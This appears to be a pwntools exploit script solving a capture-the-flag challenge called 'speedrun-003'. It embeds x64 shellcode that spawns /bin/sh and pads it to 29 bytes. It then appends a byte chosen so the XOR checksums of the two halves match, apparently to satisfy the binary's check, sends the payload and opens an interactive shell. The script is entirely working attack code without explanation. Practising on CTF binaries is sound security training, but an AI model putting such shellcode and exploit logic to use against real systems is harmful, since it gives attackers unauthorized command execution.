#!/usr/bin/env python
# coding=utf-8
from pwn import *

a=process("./speedrun-003")
elf=ELF("./speedrun-003")
context.binary="./speedrun-003"

shellcode_x64 = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
success("len ==> %d\n"%len(shellcode_x64))
shellcode_x64 = shellcode_x64.ljust(29,'A')

result1 = 0
for i in shellcode_x64[:15]:
    result1^=ord(i)

success("0 - 14 result ==> %d"%result1)

result2 = 0
for i in shellcode_x64[15:30]:
    result2^=ord(i)

success("15 - 29 result ==> %d"%result2)

shellcode_x64+=chr(result1^result2)

a.recv()
a.send(shellcode_x64)
a.interactive()




